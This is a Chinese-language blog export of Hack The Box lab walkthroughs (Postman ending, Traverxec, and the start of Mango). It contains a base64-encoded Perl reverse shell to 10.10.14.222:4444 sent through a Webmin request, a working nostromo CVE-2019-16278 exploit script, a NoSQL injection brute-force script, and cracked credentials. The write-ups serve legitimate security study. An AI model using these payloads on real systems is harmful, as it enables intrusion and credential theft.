<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;package-updates&#x2F;update.cgi HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Host: [RHOST]:[RPORT]</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line"></span><br><span class="line">Cookie: sid&#x3D;[INPUT GOOD SID HERE]</span><br><span class="line"></span><br><span class="line">Referer: [RHOST]:[RPORT]&#x2F;package-updates&#x2F;?xnavigation&#x3D;1</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 432</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">u&#x3D;acl%2Fapt&amp;u&#x3D;[PAYLOAD HERE]</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line">                POC Payload Info</span><br><span class="line">URL decoded</span><br><span class="line">  | bash -c &quot;&#123;echo,cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4yMjI6NDQ0NCIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTt3aGlsZSg8Pil7aWYoJF89fiAvKC4qKS8pe3N5c3RlbSAkMTt9fTsn&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"></span><br><span class="line">base64 decoded</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;</span><br><span class="line"></span><br><span class="line">all together decoded</span><br><span class="line">  | bash -c &quot;&#123;echo,perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;&#x3D;~&#x2F;(.*)&#x2F;)&#123;$ENV&#123;$key&#125;&#x3D;$1;&#125;&#125;$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.10.14.222:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;)&#123;if($_&#x3D;~ &#x2F;(.*)&#x2F;)&#123;system $1;&#125;&#125;;&#39;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>“Postman”是基于Linux的靶机，首先利用Redis服务器，使攻击者可以生成自己的SSH公共密钥文件并将其写入服务器，以获取对系统的未授权访问并发现用户（Matt）的已加密的ssh密钥。 我们将获取到的加密的ssh密钥使用JohnTheRipper对其进行破解以获得ssh的密码。 之后，再利用10000端口上的Webmin Portal，以Matt的身份登录并访问Webmin面板。 最后，我们在Webmin面板中搜索了关于版本号的漏洞利用，并通过metasploit成功地利用了该漏洞并获得了root。</p>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p>[<a href="https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin%201.910%20-%20Remote%20Code%20Execution%20using%20BurpSuite">https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin 1.910 - Remote Code Execution using BurpSuite</a>](<a href="https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin">https://github.com/Dog9w23/Webmin-1.910-Exploit/blob/master/Webmin</a> 1.910 - Remote Code Execution using BurpSuite)</p>
<p><a href="https://blog.csdn.net/test1988x/article/details/103921210">https://blog.csdn.net/test1988x/article/details/103921210</a></p>
<p><a href="https://www.soeren.codes/2019/12/24/postbox-writeup/">https://www.soeren.codes/2019/12/24/postbox-writeup/</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Traverxec Walkthrough</title>
    <url>/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Traverxec-Walkthrough">HTB::Traverxec Walkthrough</h1>
<h2 id="0x01-Introduction">0x01 Introduction</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200212095015.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>searchexploit</li>
<li>nostromo 1.9.6</li>
<li><a href="http://LinEnum.sh">LinEnum.sh</a></li>
<li>JohnTheRipper</li>
<li>GTFObins</li>
</ul>
<h2 id="0x03-Penetration-Test">0x03 Penetration Test</h2>
<p>nmap扫描端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.165</span><br><span class="line">Host is up (0.083s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 2048 aa:99:a8:16:68:<span class="built_in">cd</span>:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)</span><br><span class="line">| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)</span><br><span class="line">|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)</span><br><span class="line">80/tcp open http nostromo 1.9.6</span><br><span class="line">|_http-server-header: nostromo 1.9.6</span><br><span class="line">|_http-title: TRAVERXEC</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Service detection performed. Please report any incorrect results at</span><br><span class="line">https://nmap.org/submit/ .</span><br></pre></td></tr></table></figure>
<p>浏览器打开10.10.10.165，有一个发邮件的功能：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214113934.png" alt=""></p>
<p>多次测试发现没什么用，感觉这个网站是个半成品。但是我们注意到他用的中间件是<code>nostromo 1.9.6</code>，查一下有没有相关的exploit</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214143623.png" alt=""></p>
<p>刚好有一个远程代码执行的漏洞可以利用。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214144332.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214145829.png" alt=""></p>
<p>直接利用获取shell</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214151354.png" alt=""></p>
<p>再返回一个交互式shell，<code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p>
<p>在本机上启动一个服务器，将提权脚本传到靶机：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214153726.png" alt=""></p>
<p>给执行权限：<code>chmod +x LinEnum.sh</code>，执行脚本<code>./LinEnum.sh</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214154125.png" alt=""></p>
<p>发现有一个david用户，还找到了一个密码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214154413.png" alt=""></p>
<p>用JohnTheRipper尝试解密：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214155024.png" alt=""></p>
<p>尝试用<code>Nowonly4me</code>连接ssh以及su密码发现都不正确。并且不能直接<code>cd</code>进入<code>/home/david</code>目录。Google了一下思路，网上说仔细看看配置文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214155650.png" alt=""></p>
<p>在<code>HOMEDIRS</code>中配置一个<code>homedirs_public</code>路径，试一下看能不能进入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214160113.png" alt=""></p>
<p>发现了一个压缩文件，在<code>/tmp</code>目录下解压：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214160819.png" alt=""></p>
<p>把这个密钥copy到主机用JohnTheRipper爆破：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214161152.png" alt=""></p>
<p>爆破出密钥的认证密码<code>hunter</code>，用SSH连接，得到user.txt：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">david@traverxec:~$ <span class="built_in">cd</span> /home/david/</span><br><span class="line">david@traverxec:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwx--x--x 5 david david 4096 Oct 25 17:02 .</span><br><span class="line">drwxr-xr-x 3 root  root  4096 Oct 25 14:32 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Oct 25 16:15 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 david david  220 Oct 25 14:32 .bash_logout</span><br><span class="line">-rw-r--r-- 1 david david 3526 Oct 25 14:32 .bashrc</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 16:26 bin</span><br><span class="line">-rw-r--r-- 1 david david  807 Oct 25 14:32 .profile</span><br><span class="line">drwxr-xr-x 3 david david 4096 Oct 25 15:45 public_www</span><br><span class="line">drwx------ 2 david david 4096 Oct 25 17:02 .ssh</span><br><span class="line">-r--r----- 1 root  david   33 Oct 25 16:14 user.txt</span><br><span class="line">david@traverxec:~$ cat user.txt</span><br><span class="line">7db0b[--------------------]d9782f3d</span><br></pre></td></tr></table></figure>
<p>在这个目录下还有一个<code>bin</code>文件夹：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214161845.png" alt=""></p>
<p>我们基本上看到它只是输出一个HEAD（bin目录中的另一个文件）和有关服务器的一些信息。 该脚本的最后一行是最重要的，它先运行sudo，然后运行journalctl，也就是说journalctl正在以root的特权运行，因此，如果我们能控制journalctl也就拥有root特权。 但是，我们似乎无法更改任何参数。 运行除<code>sudo journalctl -n5 -unostromo.service</code>以外的任何内容时，将要求提供密码。</p>
<p>没什么思路，只能再一次求助Google，提示我们用GTFObins：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214162501.png" alt=""></p>
<p>运行<code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code>时，把窗口缩小一点，再输入<code>!/bin/sh</code>，成功获得root权限：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214181407.png" alt=""></p>
<h2 id="0x04-Summary">0x04 Summary</h2>
<p>Traverxec是一个基于Linux的靶机，开放了普通的22和80端口，80端口上运行的网站没有什么可以利用的，但是网站的中间件服务nostromo 1.9.6有一个目录穿越绕过进而造成代码执行的漏洞，以<code>www-data</code>权限进入靶机后，发现<code>/home/david</code>目录不可达。但是查看nostromo文档发现，配置文件有一个HOMEDIRS的选项，其中<code>homedirs_public</code>属性指定了网站的主目录，发现<code>/home/david/pulic_www/</code>是可达的，里面有david的私钥。提权的过程查了一下Google，发现<code>/home/david/bin</code>目录下有一个脚本，而且<code>/usr/bin/journalctl</code>是作为 root 运行的，查看 <a href="https://gtfobins.github.io/gtfobins/journalctl/">GTFObins</a>，发现通过 sudo 运行的 journalctl 可以被利用来提权，缩小窗口进而触发<code>pager</code>，获得root权限。</p>
<h2 id="0x05-nostromo-1-9-6-exploit">0x05 nostromo 1.9.6 exploit</h2>
<p>源码分析一下nostromo 1.9.6的目录穿越漏洞。先贴上利用代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">help_menu = <span class="string">&#x27;\r\nUsage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">soc</span>):</span></span><br><span class="line">    response = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            connection = soc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(connection) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            response += connection</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cve</span>(<span class="params">target, port, cmd</span>):</span></span><br><span class="line">    soc = socket.socket()</span><br><span class="line">    soc.connect((target, int(port)))</span><br><span class="line">    payload = <span class="string">&#x27;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&#x27;</span>.format(cmd)</span><br><span class="line">    soc.send(payload)</span><br><span class="line">    receive = connect(soc)</span><br><span class="line">    print(receive)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    print(art)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">        cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">        cve(target, port, cmd)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        print(help_menu)</span><br></pre></td></tr></table></figure>
<p>首先，服务器会验证请求然后处理它。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214194559.png" alt=""></p>
<p>在上图的函数<code>http_verify()</code>中，请求的首行会先进行解码，然后检查<code>/../</code>是否存在。注意，此时攻击请求的首行包含<code>/.\r./.\r./.\r./.\r./bin/sh</code>。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195010.png" alt=""></p>
<p>接下来，函数<code>http_proc()</code>会将首行传递给函数<code>http_header()</code>。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195442.png" alt=""></p>
<p>漏洞根源就在这，函数<code>http_header()</code>会通过函数<code>strcutl()</code>解析数据。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195520.png" alt=""></p>
<p>而在函数<code>strcutl()</code>的内部，你可以看到它会把字符串中的\r（回车）去除。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195727.png" alt=""></p>
<p>最后，得到的路径是<code>/../../../../bin/sh</code>。那么，目录穿越完成，命令执行如何进行呢？在函数<code>http_proc()</code>中的<code>execve()</code>函数（用于执行指定程序）中，它执行了<code>rh-&gt;rq_filef</code>，这正是路径过滤后的结果<code>/../../../../bin/sh</code>。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200214195939.png" alt=""></p>
<p>于是，我们就得到了一个可导致RCE的目录穿越。</p>
<blockquote>
<p>不得不说发现这个漏洞的师傅代码审计能力真强，我们都是弟弟。</p>
</blockquote>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://blog.csdn.net/JBlock/article/details/88619117">https://blog.csdn.net/JBlock/article/details/88619117</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Mongo Walkthrough</title>
    <url>/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Mongo-Walkthrough">HTB::Mongo Walkthrough</h1>
<h2 id="0x01-Information">0x01 Information</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200310124657.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>Nmap</li>
<li><code>LinEnum.sh</code></li>
<li>gtfobins</li>
<li>MongoDB注入</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<p>Nmap扫描靶机端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali@kali ~ % nmap -A -Pn -T4 -p- 10.10.10.162</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-11 02:44 UTC</span><br><span class="line">Nmap scan report for 10.10.10.162</span><br><span class="line">Host is up (0.060s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)</span><br><span class="line">80&#x2F;tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Mango | Search Base</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">|_Not valid after:  2020-09-26T14:21:19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 44.12 seconds</span><br></pre></td></tr></table></figure>
<p>主要来看443端口，用https访问：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200311110756.png" alt=""></p>
<p>这个页面好像除了<code>Analytics</code>之外其他都是摆设</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200311110931.png" alt=""></p>
<p>研究了会发现这个Analytics也是一个摆设，orz。。。回去再看看nmap扫描出来的端口又发现了一个信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv</span><br><span class="line">Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br></pre></td></tr></table></figure>
<blockquote>
<p>commonName: 公用名称，一般为网站域名</p>
</blockquote>
<p>编辑<code>/etc/hosts</code>文件添加解析：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.162   staging-order.mango.htb</span><br></pre></td></tr></table></figure>
<p>看到了一个登录界面</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200311112440.png" alt=""></p>
<p>好吧，这里有点坑，是基于MongoDB的NoSQL注入，试一下这里的Payload：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL Injection</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200312133707.png" alt=""></p>
<p>注入成功后是这种界面：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200312140148.png" alt=""></p>
<p>没有什么可以利用的，现在回过头去爆破用户和密码，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://staging-order.mango.htb/index.php&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Host&quot;</span>: <span class="string">&quot;staging-order.mango.htb&quot;</span>&#125;</span><br><span class="line">possible_chars = list(string.ascii_letters) + list(string.digits) + [<span class="string">&quot;\\&quot;</span> + c  <span class="keyword">for</span> c <span class="keyword">in</span> string.punctuation]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    usernames = get_users()</span><br><span class="line">    <span class="keyword">if</span> usernames:</span><br><span class="line">        print(<span class="string">&#x27;Finished!&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            password = get_password(username)</span><br><span class="line">            print(<span class="string">&#x27;&#123;&#125;:&#123;&#125;&#x27;</span>.format(username, password))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;Not Found!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_users</span>():</span></span><br><span class="line">    usernames = []</span><br><span class="line">    payload = &#123;<span class="string">&quot;username[$regex]&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;password[$regex]&quot;</span>:<span class="string">&quot;.*&quot;</span>, <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> possible_chars:</span><br><span class="line">        username = <span class="string">&quot;^&quot;</span> + c</span><br><span class="line">        payload[<span class="string">&quot;username[$regex]&quot;</span>] = username + <span class="string">&quot;.*&quot;</span></span><br><span class="line">        r = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            print(<span class="string">&quot;username start with character:&quot;</span> + c)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, get_username_length() - <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> c2 <span class="keyword">in</span> possible_chars:</span><br><span class="line">                    payload[<span class="string">&quot;username[$regex]&quot;</span>] = username + c2 + <span class="string">&quot;.*&quot;</span></span><br><span class="line">                    r2 = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">                    <span class="keyword">if</span> r2.status_code == <span class="number">302</span>:</span><br><span class="line">                        username += c2</span><br><span class="line">                        print(username[<span class="number">1</span>:])</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="comment">#if c2 == possible_chars[-1]:</span></span><br><span class="line">            print(<span class="string">&quot;Found username: &#123;&#125;&quot;</span>.format(username[<span class="number">1</span>:]))</span><br><span class="line">            usernames.append(username[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> usernames</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span>(<span class="params">username</span>):</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;login&quot;</span>: <span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line">    password = <span class="string">&quot;^&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, get_pass_length(username)):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> possible_chars:</span><br><span class="line">            payload[<span class="string">&quot;password[$regex]&quot;</span>] = password + c + <span class="string">&quot;.*&quot;</span></span><br><span class="line">            r = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                password += c</span><br><span class="line">                print(password[<span class="number">1</span>:])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    password = password[<span class="number">1</span>:].replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Found &#123;&#125;&#x27;s password: &quot;</span>.format(username) + password)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_username_length</span>():</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = &#123;<span class="string">&quot;username[$regex]&quot;</span>: <span class="string">&quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.format(length), <span class="string">&quot;password[$ne]&quot;</span>:<span class="string">&quot;&quot;</span>, <span class="string">&quot;login&quot;</span>:<span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line">        r =requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> length <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pass_length</span>(<span class="params">username</span>):</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">&quot;.&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.format(length), <span class="string">&quot;login&quot;</span>: <span class="string">&quot;login&quot;</span>&#125;</span><br><span class="line">        r = requests.post(url, data=payload, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">            length += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> length <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200317235136.png" alt=""></p>
<p>得到两个账户和密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mango:h3mXK8RhU~f&#123;]f5H</span><br><span class="line">admin:t9KcS3&gt;!0B#2</span><br></pre></td></tr></table></figure>
<p>登录mongo账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;HTB&#x2F;Boxes&#x2F;Mango# ssh mango@10.10.10.162</span><br><span class="line">mango@10.10.10.162&#39;s password:</span><br><span class="line">&lt;...&gt;</span><br><span class="line">Last login: Mon Nov 11 20:58:31 2019 from 10.10.14.7</span><br><span class="line">mango@mango:~$ su admin</span><br><span class="line">Password:</span><br><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ cd &#x2F;home&#x2F;admin</span><br><span class="line">$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 admin admin 4096 Sep 30 03:20 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Sep 27 14:02 ..</span><br><span class="line">lrwxrwxrwx 1 admin admin 9 Sep 27 14:30 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 admin admin 220 Apr 4 2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 admin admin 3771 Apr 4 2018 .bashrc</span><br><span class="line">-rw-r--r-- 1 admin admin 807 Apr 4 2018 .profile</span><br><span class="line">-r-------- 1 admin admin 33 Sep 27 14:29 user.txt</span><br></pre></td></tr></table></figure>
<p>跑一个LinEnum.sh提权脚本看有没有什么可以利用的</p>
